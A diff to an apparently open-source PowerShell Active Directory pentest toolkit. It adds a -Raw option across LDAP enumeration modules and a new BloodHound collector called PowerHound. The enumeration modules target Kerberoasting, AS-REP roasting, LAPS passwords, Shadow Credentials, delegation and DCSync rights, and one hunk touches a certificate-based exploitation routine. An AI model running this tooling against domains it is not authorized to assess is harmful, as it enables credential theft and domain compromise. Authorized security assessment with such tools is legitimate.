+        [System.String]$ObjectDN,
+
+        [Parameter(Position=5, Mandatory=$false, HelpMessage="Switch to retrieve the raw (i.e. not converted) attribute's value of a found LDAP object. For instance, retrieving 'objectSid' will always be converted into human-readable format (e.g. S-1-1-0), unless this parameter is specified.")]
+        [Switch]$Raw
     )
 
     _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
@@ -11185,75 +12857,75 @@ function _LDAPEnum {
     switch ($Enum) {
 
         'RootDSE' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base
+            return _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base -Raw:$Raw
         }
 
         'DCs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))' -Raw:$Raw
         }
 
         'Groups' {            
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=group)' |Select distinguishedname,samaccountname,objectSid,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=group)' -Raw:$Raw |Select-Object distinguishedname,samaccountname,objectSid,objectcategory
         }
 
         'Descriptions' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(description=*)' |Select-Object distinguishedName,description
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(description=*)' -Raw:$Raw |Select-Object distinguishedName,description
         }
 
         'Users' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user))' |Select-Object distinguishedName,sAMAccountName,useraccountcontrol,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user))' -Raw:$Raw |Select-Object distinguishedName,sAMAccountName,useraccountcontrol,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,objectcategory
         }
 
         'Computers' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |Select-Object distinguishedName,sAMAccountName,dnshostname,useraccountcontrol,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,operatingsystem,operatingsystemversion,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' -Raw:$Raw |Select-Object distinguishedName,sAMAccountName,dnshostname,useraccountcontrol,logoncount,lastlogon,lastlogontimestamp,pwdlastset,badpasswordtime,serviceprincipalname,operatingsystem,operatingsystemversion,objectcategory
         }
 
         'OSs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' |?{ $_.operatingSystem -ne $null -or $_.operatingSystemVersion -ne $null } |Select distinguishedName,sAMAccountName,operatingSystem,operatingSystemVersion
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -LDAPFilter '(&(objectclass=person)(objectCategory=computer))' -Raw:$Raw |?{ $_.operatingSystem -ne $null -or $_.operatingSystemVersion -ne $null } |Select-Object distinguishedName,sAMAccountName,operatingSystem,operatingSystemVersion
         }
 
         'MAQ' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -Properties 'distinguishedName,ms-DS-MachineAccountQuota' -LDAPFilter '(objectClass=domain)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -Properties 'distinguishedName,ms-DS-MachineAccountQuota' -LDAPFilter '(objectClass=domain)' -Raw:$Raw
         }
 
         'LAPS' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(ms-Mcs-AdmPwd=*)(ms-Mcs-AdmPwdExpirationTime=*)(msLAPS-PasswordExpirationTime=*))' -Raw:$Raw
         }
 
         'OUs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=organizationalUnit)'  |Select distinguishedName,ou,description,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=organizationalUnit)' -Raw:$Raw |Select-Object distinguishedName,ou,description,objectcategory
         }
 
         'Sites' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=site)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=site)' -Raw:$Raw
         }
 
         'GPOs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=groupPolicyContainer)' |Select distinguishedname,displayname,gpcfilesyspath,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=groupPolicyContainer)' -Raw:$Raw |Select-Object distinguishedname,displayname,gpcfilesyspath,objectcategory
         }
 
         'GPLinks' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(gPLink=*)(name=*))' |Select distinguishedName,name,gPLink,objectGUID,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(gPLink=*)(name=*))' -Raw:$Raw |Select-Object distinguishedName,name,gPLink,objectGUID,objectcategory
         }
 
         'Printers' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=printQueue)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectCategory=printQueue)' -Raw:$Raw
         }
 
         'LogonScripts' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(scriptPath=*)(msTSTnitialProgram=*))' |Select distinguishedName,scriptPath,msTSTnitialProgram,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(|(scriptPath=*)(msTSTnitialProgram=*))' -Raw:$Raw |Select-Object distinguishedName,scriptPath,msTSTnitialProgram,objectcategory
         }
 
         'CAs' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,$SearchBase" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKIEnrollmentService)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Public Key Services,CN=Services,CN=Configuration,$SearchBase" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKIEnrollmentService)' -Raw:$Raw
         }
 
         'CertificateTemplates' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$SearchBase" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$SearchBase" -SearchScope $SearchScope -LDAPFilter '(objectClass=pKICertificateTemplate)' -Raw:$Raw
         }
 
         'Trusts' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=trustedDomain)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(objectClass=trustedDomain)' -Raw:$Raw
         }
 
         'DnsRecords' {
@@ -11262,7 +12934,7 @@ function _LDAPEnum {
             # https://github.com/franc-pentest/ldeep/blob/a32b7c8d37cd5b4180cfceb4d0d0b19fb7e725ac/ldeep/__main__.py#L818-L820
             foreach ($Zone in @("CN=MicrosoftDNS,DC=DomainDnsZones", "CN=MicrosoftDNS,DC=ForestDnsZones", "CN=MicrosoftDNS,CN=System")) {
                 # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L3998-L4017
-                _Filter -LdapConnection $LdapConnection -SearchBase "$Zone,$SearchBase" -SearchScope 'Subtree' -Properties '*' -LDAPFilter '(objectClass=dnsNode)' |%{ 
+                _Filter -LdapConnection $LdapConnection -SearchBase "$Zone,$SearchBase" -SearchScope 'Subtree' -Properties '*' -LDAPFilter '(objectClass=dnsNode)' -Raw:$Raw |%{ 
                     try {
                         $DnsNode = $_
                         $DnsRecords = @()
@@ -11293,27 +12965,27 @@ function _LDAPEnum {
         }
 
         'admins' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectClass=person)(admincount=1))' |Select distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectClass=person)(admincount=1))' -Raw:$Raw |Select-Object distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'DAs' {
-            return _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name 'Domain Admins'
+            return _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name 'Domain Admins' -Raw:$Raw
         }
 
         'DONT_EXPIRE_PASSWORD' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'DONT_EXPIRE_PASSWORD' |Select distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'DONT_EXPIRE_PASSWORD' -Raw:$Raw |Select-Object distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'PASSWD_NOTREQD' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'PASSWD_NOTREQD' |Select distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -UACFilter 'PASSWD_NOTREQD' -Raw:$Raw |Select-Object distinguishedName,name,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'Kerberoasting' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*/*)(!(sAMAccountName=krbtgt)))' |Select distinguishedName,sAMAccountName,serviceprincipalname,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*/*)(!(sAMAccountName=krbtgt)))' -Raw:$Raw |Select-Object distinguishedName,sAMAccountName,serviceprincipalname,objectcategory
         }
 
         'ASREPRoasting' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' |Select distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' -Raw:$Raw |Select-Object distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'gMSA' {
@@ -11405,18 +13077,18 @@ function _LDAPEnum {
         }
 
         'sMSA' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)'
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(ObjectClass=msDS-ManagedServiceAccount)' -Raw:$Raw
         }
 
         'ShadowCreds' {
 
             # With no $ObjectDN specified, enumerate all Shadow Credentials
             if (-not $ObjectDN) {
-                $KeyCredentialStrings = (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n"
+                $KeyCredentialStrings = (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-KeyCredentialLink=*)' -Raw:$Raw |Select-Object -ExpandProperty msDS-KeyCredentialLink) -split "`r`n"
             }
             # Otherwise, enumerate the specified object's Shadow Credentials
             else {
-                $KeyCredentialStrings = (_Filter -LdapConnection $LdapConnection -SearchBase $ObjectDN -SearchScope 'Base' -LDAPFilter '(msDS-KeyCredentialLink=*)' |Select -ExpandProperty msDS-KeyCredentialLink) -split "`r`n"
+                $KeyCredentialStrings = (_Filter -LdapConnection $LdapConnection -SearchBase $ObjectDN -SearchScope 'Base' -LDAPFilter '(msDS-KeyCredentialLink=*)' -Raw:$Raw |Select-Object -ExpandProperty msDS-KeyCredentialLink) -split "`r`n"
             }
 
             $KeyCredentials = [PSCustomObject]@()
@@ -11488,15 +13160,15 @@ function _LDAPEnum {
         }
 
         'Unconstrained' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' |Select distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Raw:$Raw |Select-Object distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'Constrained' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToDelegateTo=*)' |Select distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory,msds-allowedtodelegateto
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToDelegateTo=*)' -Raw:$Raw |Select-Object distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory,msds-allowedtodelegateto
         }
 
         'RBCD' {
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' |Select distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory,msds-allowedtoactonbehalfofotheridentity
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)' -Raw:$Raw |Select-Object distinguishedName,objectsid,sAMAccountName,useraccountcontrol,objectcategory,msds-allowedtoactonbehalfofotheridentity
         }
 
         'WritePrincipal' {
@@ -11509,31 +13181,31 @@ function _LDAPEnum {
                     $_.AceQualifier -eq 'AccessAllowed' -and ($_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*GenericWrite*' -or $_.AccessMaskNames -ilike '*WriteProperty*' -or $_.AccessMaskNames -ilike '*WriteDACL*') -and ($SourceSID -match 'S-1-5-21-(\d+-){3}\d{4,}' -or $SourceSID -match 'S-1-5-21-(\d+-){3}513' -or $SourceSID -match 'S-1-5-21-(\d+-){3}515' -or $SourceSID -in @('S-1-1-0', 'S-1-5-11', 'S-1-5-15', 'S-1-5-7', 'S-1-5-32-545', 'S-1-5-32-546')))
                 } | Add-Member -PassThru -Force -NotePropertyName 'TargetDN' -NotePropertyValue $TargetObject.distinguishedname
             }
-            return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select -ExpandProperty distinguishedName); $_}
+            return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select-Object -ExpandProperty distinguishedName); $_}
         }
 
         'DCSync' {
             $ResultObjects = @()
-            _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -Properties * -LDAPFilter '(objectCategory=domain)' |%{
+            _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -Properties * -LDAPFilter '(objectCategory=domain)' -Raw:$Raw |%{
                 $TargetDomain = $_; 
                 $ResultObjects += _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDomain.distinguishedName |?{
                     $_.AceQualifier -eq 'AccessAllowed' -and ($_.AccessMaskNames -ilike '*GenericAll*' -or $_.AccessMaskNames -ilike '*Write*' -or $_.ObjectAceTypeName -imatch 'DS-Replication-Get-Changes(-All)?$') -and ($_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}\d{4,}' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}513' -or $_.SecurityIdentifier -match 'S-1-5-21-(\d+-){3}515' -or $_.SecurityIdentifier -in @('S-1-1-0', 'S-1-5-11', 'S-1-5-15', 'S-1-5-7', 'S-1-5-32-545', 'S-1-5-32-546'))
                 } | Add-Member -PassThru -Force -NotePropertyName 'TargetDN' -NotePropertyValue $TargetDomain.distinguishedname
             }
-            return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select -ExpandProperty distinguishedName); $_}
+            return $ResultObjects |%{ $_ |Add-Member -Force -NotePropertyName 'SecurityIdentifierDN' -NotePropertyValue (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -SIDFilter $_.SecurityIdentifier |Select-Object -ExpandProperty distinguishedName); $_}
         }
 
         'PassPol' {
             Write-Host "[*] The Provided 'DefaultPassPol2022DC.txt' May Be Checked To Get The Default Password Policy In Windows Server 2022 DC."
             Write-Host ""
 
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=domain)' |Select-Object distinguishedName,lockoutobservationwindow,lockoutDuration,lockoutThreshold,maxPwdAge,minPwdAge,minPwdLength,pwdHistoryLength,pwdProperties,msDS-PasswordReversibleEncryptionEnabled
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=domain)' -Raw:$Raw |Select-Object distinguishedName,lockoutobservationwindow,lockoutDuration,lockoutThreshold,maxPwdAge,minPwdAge,minPwdLength,pwdHistoryLength,pwdProperties,msDS-PasswordReversibleEncryptionEnabled
         }
 
         'All' {
             # Executing only the enumeration modules with the strict minimum number of mandatory parameters. For instance, we won't run OUMembers, or GroupMembers, as they require a specific parameter.
             foreach ($Enum in @('RootDSE', 'DCs', 'admins', 'DAs', 'Groups', 'Descriptions', 'Users', 'Computers', 'OSs', 'MAQ', 'LAPS', 'OUs', 'Sites', 'GPOs', 'GPLinks', 'Printers', 'LogonScripts', 'CAs', 'CertificateTemplates', 'sMSA', 'Trusts', 'DnsRecords', 'DONT_EXPIRE_PASSWORD', 'PASSWD_NOTREQD', 'Kerberoasting', 'ASREPRoasting', 'gMSA', 'ShadowCreds', 'Unconstrained', 'Constrained', 'RBCD', 'DCSync', 'PassPol')) {
-                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope
+                _LDAPEnum -LdapConnection $LdapConnection -Enum $Enum -SearchBase $SearchBase -SearchScope $SearchScope -Raw:$Raw
             }
         }
 
@@ -11546,7 +13218,7 @@ function _LDAPEnum {
             # First degree membership
             $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(&(cn=$Name)(|(member=*)(objectClass=group)))"
             # Filter CRLF-split the 'member' multi-valued attribute. Hence, we split back that string to get an array
-            $Result = ($Result |Select -ExpandProperty Member) -split "`r`n" | %{ _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(distinguishedName=$_)" }
+            $Result = ($Result |Select-Object -ExpandProperty Member) -split "`r`n" | %{ _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -LDAPFilter "(distinguishedName=$_)" }
             $Results += $Result
 
             # Grabbing each value within the 'member' array attribute of the group. 
@@ -11557,13 +13229,13 @@ function _LDAPEnum {
                 $Results += _LDAPEnum -LdapConnection $LdapConnection -Enum 'GroupMembers' -Name $_.cn
             }
 
-            return $Results |Select distinguishedname,sAMAccountName,memberof,objectCategory
+            return $Results |Select-Object distinguishedname,sAMAccountName,memberof,objectCategory
         }
 
         'OUMembers' {
             if (-not (_Helper-IsEveryValueOfArrayDefined @($Name))) { Write-Host "[*$Enum*] [!] At Least One Required Parameter Couldn't Be Found, Or Is Missing ! Check Examples Adding -h ! Returning..."; return; }
             # Not using the OU's DN as a base for search (e.g. 'OU=Unity,DC=X') allows to prevent the user to provide the OU's DN. Instead, the user may only specify 'Unity', Quicky'n'Handy.
-            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
+            return _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -Raw:$Raw |?{ $_.distinguishedName -like "*,OU=$Name,*" } |Select-Object distinguishedName,sAMAccountName,useraccountcontrol,objectcategory
         }
 
         'Owner' {
@@ -11571,7 +13243,7 @@ function _LDAPEnum {
 
             $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -SIDFilter (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'nTSecurityDescriptor').Owner.Value
 
-            return $Result |Select distinguishedName,objectSid
+            return $Result |Select-Object distinguishedName,objectSid
         }
 
         'Creator' {
@@ -11579,7 +13251,7 @@ function _LDAPEnum {
 
             $Result = _Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope $SearchScope -SIDFilter (_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $ObjectDN -Attribute 'mS-DS-CreatorSID')
 
-            return $Result |Select distinguishedName,objectSid
+            return $Result |Select-Object distinguishedName,objectSid
         }
 
         Default { Write-Host "[!] LDAP Enumeration '$Enum' Not Recognized !"; return }
@@ -11750,7 +13422,7 @@ function _LDAPExploit {
 
             try {
 
-                $sAMAccountName = _Filter -LdapConnection $LdapConnection -SearchBase $TargetDN -SearchScope Base |Select -ExpandProperty sAMAccountName
+                $sAMAccountName = _Filter -LdapConnection $LdapConnection -SearchBase $TargetDN -SearchScope Base |Select-Object -ExpandProperty sAMAccountName
 
                 # 1. Generate a self-signed certificate and export to file
                 $NewSelfSignedCertificate = _Helper-GenerateSelfSignedCertificate -CN $sAMAccountName
@@ -11979,6 +13651,473 @@ function _LDAPExploit {
 
         Default { Write-Host "[!] LDAP Exploitation '$Exploit' Not Recognized !"; return }
     }
+}
+
+
+function _PowerHound {
+    
+    <#
+
+        .SYNOPSIS
+
+            This function is a BloodHound data collector / ingestor, i.e. returning the JSON files to be populated into BloodHound
+
+            - Version 5 ONLY is currently supported.
+            - PowerHound is able to gather data through Schannel (hence through LDAP) ONLY. Therefore, some BloodHound data, like computer sessions related to SMB, CANNOT be collected.
+            - PowerHound has been implemented using an environmental lab empirically comparing the lab's data and a regular SharpHound collection. In particular, the environment lab used is likely not to illustrate every possible AD scenarios. Hence, the generated collection is NOT guaranteed to be exhaustive (especially for ACE BloodHound edges, e.g. Trusts). For exhaustivity, prefer using the other enumeration functions (e.g. GetInboundACEs, GetInboundSDDLs).
+            - Bloodhound supports the 'AllowedToAct' (RBCD) data entry in the 'computer.json' collection file. Yet, the edge is likely not shown within BloodHound. Hence, prefer using the 'LDAPEnum' action with 'RBCD' instead.
+
+        .PARAMETER LdapConnection
+
+            [System.DirectoryServices.Protocols.LdapConnection] 
+            
+            The established LDAP Connection Instance.
+
+        .PARAMETER Domain
+
+            [System.Custom] 
+            
+            The domain to enumerate.
+
+        .PARAMETER BloodHoundVersion
+
+            [System.Int32] 
+            
+            The version of the BloodHound Collection (among: 5)
+
+            - Defaults to 5.
+
+        .PARAMETER NoZip
+
+            [Switch] 
+            
+            Whenever specified, the returned JSON files are NOT compressed into a ZIP, but exported into a local folder instead.
+
+        .EXAMPLE
+
+            _PowerHound -LdapConnection $LdapConnection -Domain 'ADLAB.LOCAL'
+
+            Returns the BloodHound data v5 (default) for domain `ADLAB.LOCAL` into a ZIP archive
+
+        .EXAMPLE
+
+            _PowerHound -LdapConnection $LdapConnection -Domain 'ADLAB.LOCAL' -BloodHoundVersion 5 -NoZip
+
+            Returns the BloodHound data v5 for domain `ADLAB.LOCAL`, without ZIPing the collected files.
+
+        .LINK
+
+            https://bloodhound.specterops.io/integrations/bloodhound-api/json-formats
+
+        .LINK
+
+            https://github.com/SpecterOps/BloodHound/tree/a8dd29433b05b2c1aed207d67405ede5ba3177b7/cmd/api/src/test/fixtures/fixtures/v6
+
+        .LINK
+
+            https://github.com/dirkjanm/BloodHound.py/tree/fd3f322e066d66314bfb31d4ae6f497df5872177
+
+        .LINK 
+
+            https://github.com/Pennyw0rth/NetExec/blob/aecad76f0b396a70a5cf0652cd477a2a0ace82f4/nxc/protocols/ldap/bloodhound.py
+
+        .LINK
+
+            https://github.com/SpecterOps/SharpHound/tree/7faa2bbd18af9a086a72acad9a7085d906dd92ad
+
+    #>
+    
+    [CmdletBinding()]
+    param(
+        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
+        [ValidateNotNullorEmpty()]
+        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
+
+        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the domain from which to collect BloodHound database")]
+        [ValidateNotNullorEmpty()]
+        [System.String]$Domain,
+
+        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the version of the BloodHound JSON files (among: 5)")]
+        [PSDefaultValue(Help="Defaults to version 5")]
+        [System.Int32]$BloodHoundVersion = 5,
+
+        [Parameter(Position=3, Mandatory=$false, HelpMessage="Specify this switch if you don't wan't the collected output files to be ZIPed")]
+        [Switch]$NoZip
+    )
+    
+    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters
+    
+    Write-Host -ForegroundColor Blue "[*] PowerHound Is Ingesting Data From Domain '$Domain'..."
+
+    Write-Host ""
+
+    if ($BloodHoundVersion -eq 5) {
+
+        # Dumping the BloodHound data, then creating local SID and DN lookup tables for instant association
+        $BloodHoundObjects        = _Helper-PowerHound-GetBloodHoundObjects -LdapConnection $LdapConnection -Domain $Domain
+        $BloodHoundSIDLookupTable = _Helper-PowerHound-GetSIDLookupTable -BloodHoundObjects $BloodHoundObjects
+        $BloodHoundDNLookupTable  = _Helper-PowerHound-GetDNLookupTable -BloodHoundObjects $BloodHoundObjects
+
+        # Arbitrarily choosing the first domain object to get the domain SID.
+        $DomainSID = $BloodHoundObjects["DomainObjects"][0].objectsid;
+
+        Write-Host ""
+
+        # Generating "domains.json"
+        Write-Host "[*] Generating Domains Collection..."
+        $Data = @()
+        $BloodHoundObjects["DomainObjects"] | ForEach-Object {
+            $Data += @{
+                "ObjectIdentifier" = $_.objectsid;
+                "Properties"       = _Helper-PowerHound-GetProperties -LDAPObject $_ -DataType 'domain' -DomainSID $DomainSID;
+                "ChildObjects"     = @(_Helper-PowerHound-GetChildObjects -LdapConnection $LdapConnection -LDAPObject $_);
+                "Links"            = @(_Helper-PowerHound-GetLinks -LDAPObject $_ -BloodHoundObjects $BloodHoundObjects);
+                "Trusts"           = @();
+                "IsDeleted"        = $null -eq $_.isdeleted;
+                "IsACLProtected"   = 0 -ne ((_GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $_.distinguishedname -Attribute 'nTSecurityDescriptor').ControlFlags -band 0x1000) # http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm
+                "Aces"             = _Helper-PowerHound-GetAces -LdapConnection $LdapConnection -LDAPObject $_ -BloodHoundSIDLookupTable $BloodHoundSIDLookupTable -Domain $Domain;
+            }
+        }
+        $DomainsCollection = @{
+            "data" = $Data;
+            "meta" = @{
+                "type"    = "domains";
+                "count"   = ($Data | Measure-Object).Count;
+                "version" = $BloodHoundVersion
+            }
+        }
+
+
+        # Generating "users.json"
+        Write-Host "[*] Generating Users Collection..."
+        $Data = @()
